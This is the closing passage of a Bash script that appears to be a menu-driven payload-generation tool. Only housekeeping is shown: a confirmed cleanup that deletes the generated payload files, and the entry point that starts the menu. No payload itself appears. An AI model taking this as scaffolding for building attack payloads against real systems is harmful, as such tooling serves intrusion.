  fi
  
  echo ""
  read -p "$(echo -e ${DIM}"Press [Enter] to continue...")"
}

clean_payloads() {
  clear
  banner
  echo -e "${RED}[!] Are you sure you want to delete all generated payloads? (y/n)${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" confirm
  
  if [[ "$confirm" == "y" ]]; then
    rm -f "$PAYLOAD_DIR"/*
    echo -e "${GREEN}[+] All payloads deleted.${NC}"
  else
    echo -e "${YELLOW}[*] Cancelled.${NC}"
  fi
  
  sleep 1
}

#==============[ ENTRY POINT ]==============

clear
init_tracker
check_deps
main_menu
